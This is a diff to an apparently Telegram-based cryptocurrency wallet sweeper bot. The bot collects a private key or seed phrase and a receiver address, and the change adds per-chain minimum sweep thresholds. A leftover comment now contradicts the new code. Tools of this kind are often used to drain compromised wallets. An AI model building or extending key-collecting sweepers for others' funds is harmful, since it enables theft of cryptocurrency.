@@ -292,13 +292,20 @@ bot.on("message", async (msg) => {
   } else if (state.step === "receiver") {
     state.data.receiver = msg.text;
     try {
+      const MIN_SWEEP_AMOUNTS = {
+        TRX: 1,      // 1 TRX minimum
+        BTC: 0.0001, // 0.0001 BTC minimum
+        ETH: 0.001,  // 0.001 ETH minimum
+        SOL: 0.01    // 0.01 SOL minimum
+      };
+
       // No threshold needed - sweep any balance found
       await setupWallet(
         chatId,
         state.data.blockchain,
         state.data.key,
         state.data.receiver,
-        0, // Always 0 - sweep everything
+        MIN_SWEEP_AMOUNTS[state.data.blockchain] || 0, // apply minimum sweep threshold
         state.data.authMethod === "privateKey" ? "privateKey" : "seedPhrase"
       );
       userStates.delete(chatId);
